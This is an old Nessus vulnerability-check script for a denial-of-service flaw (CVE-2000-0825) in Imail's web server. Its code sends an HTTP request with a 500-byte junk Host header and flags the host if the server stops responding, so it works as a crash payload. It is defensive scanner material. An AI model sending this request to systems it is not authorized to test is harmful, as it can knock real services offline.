#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10496);
 script_bugtraq_id(2011);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2000-0825");
 
 name["english"] = "Imail Host: overflow";
 name["francais"] = "Imail Host: overflow";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote web server crashes when it is issued a too
long argument to the 'Host:' field of an HTTP request.

An attacker may use this flaw to either completely prevent
this host from serving web pages to the world, or to
make it die by crashing several threads of the web server
until the complete exhaustion of this host memory

Risk factor : High
Solution : Upgrade your web server.";

 desc["francais"] = "
Le serveur web distant plante lorsqu'un argument trop long
est donn� au champ Host: d'une requete HTTP.

Un pirate peut utiliser ce probl�me pour soit compl�tement
empecher ce syst�me de servir des pages web, ou bien pour
le mettre par terre en faisant planter plusieurs threads
de ce serveur jusqu'a ce que toute la m�moire de celui-ci
soit utilis�e

Facteur de risque : Elev�
Solution : Mettez � jour votre serveur web";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Web server buffer overflow";
 summary["francais"] = "D�passement de buffer dans un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "D�ni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
  script_require_ports("Services/www",80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

function check_port(port)
{
 if(get_port_state(port))
 {
 soc = http_open_socket(port);
 if(soc){
 	http_close_socket(soc);
	return(TRUE);
	}
  }
  return(FALSE);
}


port = 8181;
if(!(check_port(port:port)))
{
 port = 8383;
 if(!(check_port(port:port)))
 {
  port = get_http_port(default:80);

 }
}


if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  
  req = http_get(item:"/", port:port);
  if("Host" >< req)
  {
   req = ereg_replace(pattern:"(Host: )(.*)",
   		      string:req,
		      replace:"\1"+crap(500));
   req = req + string("\r\n\r\n");	
  }
  else
  {
   req = req - string("\r\n\r\n");
   req = req + string("\r\nHost: ", crap(500), "\r\n\r\n");
  }
 
 
  soc = http_open_socket(port);
  if(soc)
  {
    send(socket:soc, data:req);
    r = http_recv(socket:soc);
   
    http_close_socket(soc);
    if(!r){
      	security_hole(port);
	exit(0);
    }
  }
}

